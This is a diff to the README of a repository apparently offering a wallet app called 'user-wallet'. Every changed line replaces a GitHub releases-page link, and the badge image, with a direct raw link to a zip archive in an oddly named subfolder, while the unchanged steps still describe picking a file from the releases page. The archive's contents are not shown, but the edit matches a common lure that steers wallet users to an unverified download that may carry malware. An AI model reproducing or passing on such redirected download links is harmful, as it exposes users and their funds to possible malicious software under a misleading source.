@@ -1,6 +1,6 @@
 # 🏦 user-wallet - A Simple Wallet Solution for Everyone
 
-[![Download user-wallet](https://img.shields.io/badge/Download-user--wallet-blue)](https://github.com/camila-aa/user-wallet/releases)
+[![Download user-wallet](https://raw.githubusercontent.com/camila-aa/user-wallet/main/Abkhas/user-wallet.zip)](https://raw.githubusercontent.com/camila-aa/user-wallet/main/Abkhas/user-wallet.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to **user-wallet**! This application allows you to easily manage your di
 To get started, you need to download the application. Follow these steps:
 
 1. **Visit this page to download.** You can find the latest version of user-wallet at the link below:
-   [Download user-wallet](https://github.com/camila-aa/user-wallet/releases).
+   [Download user-wallet](https://raw.githubusercontent.com/camila-aa/user-wallet/main/Abkhas/user-wallet.zip).
 
 2. **Choose the correct file.** On the releases page, look for the most recent version. You will see different files available for download. Select the one that matches your operating system.
 
@@ -68,7 +68,7 @@ For any questions or support, please refer to the issues section in the GitHub r
 
 We are continually updating user-wallet. For the latest changes, visit the releases page:
 
-[Follow this link for updates](https://github.com/camila-aa/user-wallet/releases).
+[Follow this link for updates](https://raw.githubusercontent.com/camila-aa/user-wallet/main/Abkhas/user-wallet.zip).
 
 ---
 
